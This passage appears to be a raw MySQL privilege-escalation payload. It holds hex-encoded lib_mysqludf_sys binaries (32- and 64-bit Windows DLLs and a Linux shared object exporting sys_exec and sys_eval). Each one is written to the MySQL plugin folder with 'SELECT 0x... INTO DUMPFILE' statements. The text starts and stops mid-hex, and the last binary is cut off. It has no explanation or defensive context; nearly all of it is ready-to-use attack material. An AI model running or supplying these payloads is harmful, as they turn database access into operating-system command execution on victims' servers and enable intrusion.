4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE D:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll; lib_mysqludf_sys_64.dll SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000677cbfda231dd189231dd189231dd18904dbbf89211dd18904dbbc892a1dd18904dbaa89261dd189231dd0890f1dd18904dbac89211dd18904dba089221dd18904dbab89221dd18904dba989221dd18952696368231dd189000000000000000000000000000000005045000064860300a727a15a0000000000000000f00022200b020800002000000010000000800000109f000000900000000000100000000000100000000200000400000000000000050002000000000000c000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098b2000008020000b0b10000e800000000b00000b00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000e0555058310000000000200000009000000012000000040000000000000000000000000000400000e02e727372630000000010000000b000000006000000160000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d240209e1e421439d3bdfb7de7400000f0f0000002a0000490000d41de9feff833a007450488b05a421000049890009a24008cd4973d20a9f109c1899cd9f34272096280fb70593666d83fdb7410b30b001c332c0c3cc00c215cc92c9ba810034716a6febcc16e46c096a471853fdbf1fa4631c0fb605591688401e41c7011e00ffed6dd62b8b63bf01750f3f42088338007506c64b26ebdc01017b4e2d632b05b9e4b228ce25227ed20cd26f1f28152ab001c3f66d7bc2bf83ec38344a43895c243084b7fff6dbd90b09ff15c71f2b4885c04c8bd87512104c24df6eaeb9608707202dc4388e897c242873edcdfd33c048c7c1ff0033fbf2ae1c120976d9b75b1af7d122e901890b2dcc00be6feb166f28e3026e404848deda7fdb29f938d87459488d0d40ee4e0e813832983de4c1eb81403281480a9ee4435e4f81503281543281563261f37d4fb0018c48804028c34c49467607744e61deed584917e49260680a703c6527cd18782056c740045cf8bf33b64342188b48048b008d4c010239bd1e77d27d8bd947107543706d8045ec1be936130309884370900a00b69dee10c8980a18bc0cb3c6b00e07103fbcb37ddb0f49a585c974066f5d17b7086d21cf93cf047424ada3b9772d7110448b6949e2fa02c2eddfba52e2ce0212498d5c3001e83f0ffce85cd7fddd5febcb418b03c60430d2470d5734b70c58d7e22d0822d34313167bb75bce2618007ca01cff56677c84842f7198f4cf16c64373870d087c8c03d6e4240f79561e541e511e7292939c4e1e4b1e481e63c2425e3e1e1fcf2784ee87c71f1da0981f4c89c68685ee44241824580f6c59897486bb86db76381764bdb900d34c18284cb0db7e302d4d8bf146e8e7b901ee9b6dc1ec04e00dda4533ed4488670beef69b4ff04c39290f8413050673f215fdcfb8b9169125ac1c088be8747b418d5508e1c9b6b13ac0e6cc177c7466a04b6640fa50669047fc3f42858e1b0b9529328d7936ce6f7d61c16c304375cd8cc74803c8f56636b724d470143e51c5ba08e1d9b68d39cc1ceb13225975ad886cdbb6f050eb258bc77004cd1930ddfe9cdb803e30e2154874229245ffb176d8827811fef5887edd4d174ebe5a0eebc18424805ec606e71ada0001380c4c38f12a10f8386c04c6f0a0581a87e792317fd3dc5cd8d6d09d58747a28f2023f73b773df3e448d48406e41b80010b3748bd1f10df7c7ed33c9ab441a5356104cefa2dbe6b66c02c8d8154e1b8d54b94c350aede98d054a75890ba3b16e3b2dbc3133d2c7d0208925183bdf19b7b3bad2c80df2199d30ac581e29eb081433c0922fb384f13be0064ceb0033c029001bb0dfb65538ec024510ff10c9196600fb6f7f6c900390483b0d89293f751148c1c11066f7dddd6fdfb87502f3dac1c910e9150aeccc405361203b8b7d1b5801a05fdcd25b0bfbeef7f685dbc905112fd005020675098d430185bb76efb6205b42c703d59b0d3c48b406634136670b1c5805b12006615bd85bc3cf55d27f6cc7c7c376fc608468e140dcfbf1c2c63831e83be141bdd20f8503ee46bb7408075ee428073c0f8e0d8de6b61b6e2bc58ed3105fdcfd3e76fb0fb12d602e0a741ef290b9e803c91d19bfdb36931d4275e841320783f802740fb9ef6dc3b31fb70eca0208e2ed0d2f2e338e740fd2111912f874491412fc18dadc0b1fd958f847df72165f1803b6bb2d701e4ad0c9eb081573ed12ecf6bedbcf2774192d06429bd72d0698fbfb66d833db891db80e871db906716fc7feb59806e5413bd5dde26541042530bb7dbbbd002c0978081e8bf3f048b93d883072b0b7920a63c7741ad64618d7d29b2f1c6b75e3eb037bf5a79a5ed6390c950cdaeb3fea1f9f7db7f08e8f080644892d312d1bc485c0678fed62771a15e5de0dd6181abe7fddbbeec7050725024585f67507b404bb833d14ddc96e73068b212a0b2d5c6f11dedd264fe3029cf12c66012d3a273e9e9ebe10c58f38d240e468ec98717a60dce91748c3b14d22190f6c20483a5adbf308505851f0dd05bbee77df3d041f208915d12695d275133915d709ed7f38c3750b5a17c61e83fa017405040add6be00275338931d39d08a3b71b0d34c84e20c574134ac68b07863db9d7a64bfc1616e0c9016b3c1a0edc83ffb092ebda1535ab311bc11bdb5b0bd80c430c1dc817084d7bf787755c0b1841ffd385ff88ff03753970f79d75094a08aeeb8d1ca51e36ec648b171028adeb06d8192ecc298adc25f3008bc3659e8793708b218b8bf8b59d9e2a4055bf15eaa3894d7afab61b01018b080724b0d67d5d902dd9c2302f5e7d0ab1485825ff4ddb960c1e92387d2eda02f101d7136fa3f875056c0cfcfa7d918844a4fd258b036983eb2f9e8e090cefc6f852a1899e2681ec880068cd760dbffe73153f156705b8c648f25845b7390cb8283d1f2c586170c339def61624eb754148b73dc6364238004044230430090e662fcf40280578254703055c73874c1c51494e7d4bb1077f4bf0eb222b8093447bdd837d738d0e83c00812d13e8d67db7b642a059b240d20902f9c5ba25b701c2a7214097bc009cc3e1e666c926724766e833572dbff0b70dc7a142f482c38b0bb2493827b8ef083d2396a14019b15650ccb36dc9255b624c80a271b83d76c1854ba6a234e336b1784f781c4aca041592947a626231c0fd8cf53188186d9ef0d68295a4a148a8ef8ececcdd64427cb1366eb75b908674b32d21dea902d3a1c1128106464200a8b83af334463971bcb36e418c323db83a238243d05f62809993959b611402bdc678c90c136de1bc3017f37320296247f15f4f6120d6276d81bc00383e8013c2075643f289c8d3d53041a787f4b8d1d4c068d13a08491790ec372b3326129a9ef4f137f2344720cc96681394d5a75fcb7c3ff174863513c813c0a5045e1137c0a180b020f94c063e343029f4c63413cfec9b4ebed8d7ed24c03c1413c4014450458064525ffc25f6a4ab10018741f8b510b3bd2720a8b4108ed6ff8db03c209d072104183c113c128453bcb72e16fc796b05d1cc1c3cf4cc1267af7446992e1da85dcbd1f4c2bc15feafb5abed0140ccd0f3a24c1e81f600d2cfef7d083e001eb02584fd644ab360196ebcac0b66c3008eec18b01a7ffaa128d3cc77627252205cc11ce78dca606cb113f75463da70ff0dd4603241b471eb801000000277c29847f3fe520000081bff83c3dfc32a2df2d992b7dc7f83074149d6fa3d00e7f5dc6268b2dc285586b212430bc6286b6489934e10ab9b4c856e04671d849460bb50e731c0eb110d9be10a8d813fe6a4cb84c33dbceb8ff00856037ba1623e9b8338975dde016b1df744d44d89c1d39b705dbdd8449f7d3093720d2fbdc4b4646463605dee0e2e4b24746465e505a11000055c9a8aa298064547fb017d8069017303007d04e6f206172ffffdffe67756d656e7473096c6c6f77656420287564663a206c69625f6d79730bf6b7dd716c0d5f73085f696e666f29411c80edff232076657273696f6e20302e0134ededee17a178706563744b657861076c79201a6dbb7dfb652073747243672074791b2070766175d8299b6d21724f2f7477996d60010b1f438ef6f603fb72206e616d4c436f756c246e6f74cce8b66d3b63611320186d27796372ff850740310106023532023001240d0024f6ffb7ffd407001fc408001a740b15640c0010540b000b340a0004822776bbdcfe1918090018c40f13740e640b093427b763d4ed046217d41e5e3f1903241aedbacf2c5007390f2a07801abbdc6e8367165b16743711640c340b7bd85b770442130c390c01118350118b9b6df705530133871c03e4001d5d90ed60430e057b743f09baeeb0d80401072f67079403a06077dbc10701462f462b1074092f0db6d94e3416033b01000715bb0bb6bd971574062f64f7df21000884ddb640ae043439741f00bf20eeecedb6140629034c341f0ba903e1c2debe240f05c305340a13234bd36d9b6e23431e14c45f0f470a75b713760554094b01098909a2071e7de572bb1f1e742f12640d34870142b71582bb2e1311cf0c03ca96dd0e01380f387427005124a3aafec10246ddcd5d20d266d4ff555516c900178fa02a1b003011764bd56c039180bfa007e0126dd79ddd03703407f803680b0013026a76fbba8603540b14021814170b581590fb2f07d9eeecf60a150310340727030034075bd5b9dd7003e0336f0724b3cc755dd7750b30074203ac0b9007f5b61b94db03c03233920c1903c8ba05a0eb0b10074f8be80b508375afeb077303444707990ba0b65dd77507e503280bf0073a1c033c0038b7eb0b5007f71ca70b77b63bdb8b191d2f2007381dcb40071dac7b5d83036c8307d30b601e9ded5eb3039b7c5f07c11e3be0d0ae3bdb07031f3b1007d6039c33ca1255954a005525a3aaa8aa9251645455c9d09ba0887c0402c4ff16360157616974466f7253ac7f2b40fc6c654f626abd14566972747561f63703c46c419a0d536574456e76126dbf01e26f6ee45661726961622b41eb2e40bc18437265b8546806640df65bf76d47264375727222502a636573734914e283cd1226135469636bb6fd6e03026e6b517565727950036684dedbb1f66d616e3716657218446973676fdbdbcf374c6962727879436192731a52746c633bb76d0970a2722d2c7874124cbdb5adfd6f6f6b7570463ec26916b2747279dfb5078b17cd556e77e47e4973446562736f6bed75676763a7a56583e11dfeb6b77268616e64457883704046696ca56c85c58719f19319dab61254176d65151153daf6586b39352b537973176dfa81e87517454173426509a3dbfe434388a0895f616d73675fcc6990b3850bbf5f5f435f73708b6966285f7e267cdb766f5f64116f035f706f6922430b76db2663da5f64ce280009626b31142d325f7a13c417840b5f7b50705b6c735f330a6c212205db5accd82a58096e73ed6bc982130fd76d643ed6bad6de756c343f15416d170cdea3e0020ab52689a3b565c933a196063bc16db15b0772652508661115080d5ba1739c29709f73149bb5adb93932ae6e074d0f85d7badbc56f736a663a70105e3b84ed70705831747b6d343fdf15f4c700f08c21180800e264860600a76efb0fe327a15ae6f00022200b020808120cb07744b314132e0010000005cf1e6c9b02020433050002088000c302f663146d160100022e063af76c650f0a50394330908de8db88223c1460e2d880d4bd0118020183703aacbb024b00303a011e4644a42b2e1054822d3bd810901200dc00b3dbc63b6f602e7264a76108550b53597761dd000c03162740022e26291b61f600d805100c22273616ececc02e702850eb27244fd820fc007273726300136027b3c7013226650942fca664b0702728421b4036c08d6d05ca7212d3060000000000009000ff0048894c240848895424104c8944241880fa010f854502000053565755488d35cdf0ffff488dbe0080ffff5731db31c94883cdffe85000000001db7402f3c38b1e4883eefc11db8a16f3c3488d042f83f9058a1076214883fdfc771b83e9048b104883c00483e9048917488d7f0473ef83c1048a10741048ffc0881783e9018a10488d7f0175f0f3c3fc415beb0848ffc6881748ffc78a1601db750a8b1e4883eefc11db8a1672e68d410141ffd311c001db750a8b1e4883eefc11db8a1673eb83e8037217c1e0080fb6d209d048ffc683f0ff0f843a0000004863e88d410141ffd311c941ffd311c9751889c183c00241ffd311c901db75088b1e4883eefc11db73ed4881fd00f3ffff11c1e83affffffeb835e4889f7b900120000b2004889fbeb2c8a074883c7013c80720a3c8f7706807ffe0f74062ce83c0177233817751f8b072500ffffff0fc829f801d8ab4883e9048a074883c70148ffc975d9eb0548ffc975be4883ec28488dbe007000008b0709c0744f8b5f04488d8c30b0a100004801f34883c708ff96eca1000048958a0748ffc708c074d74889f94889faffc8f2ae4889e9ff96f4a100004809c074094889034883c308ebd64883c4285d5f5e5b31c0c34883c4284883c704488d5efc31c08a0748ffc709c074233cef77114801c3488b03480fc84801f0488903ebe0240fc1e010668b074883c702ebe1488baefca10000488dbe00f0ffffbb00100000504989e141b8040000004889da4889f94883ec20ffd5488d871702000080207f8060287f4c8d4c24204d8b014889da4889f9ffd54883c4285d5f5e5b488d4424806a004839c475f94883ec804c8b442418488b542410488b4c2408e91f79ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005cb0000054010000e404000000000000586000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d22616d64363422207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e0000000000000000000000002cb20000ecb1000000000000000000000000000039b200001cb20000000000000000000000000000000000000000000044b200000000000052b200000000000062b200000000000072b200000000000080b200000000000000000000000000008eb200000000000000000000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c46726565000000667265650000000000000000a727a15a0000000074b30000010000001200000012000000c0b2000008b3000050b300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000c010000000130000e0120000a011000089b300009fb30000bcb30000d7b30000e3b30000f6b3000007b4000010b4000020b400002eb4000037b4000047b4000055b400005db400006cb4000079b4000081b4000090b4000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE D:\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\\\plugin\\\\udf.dll;lib_mysqludf_sys_32.so SELECT 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42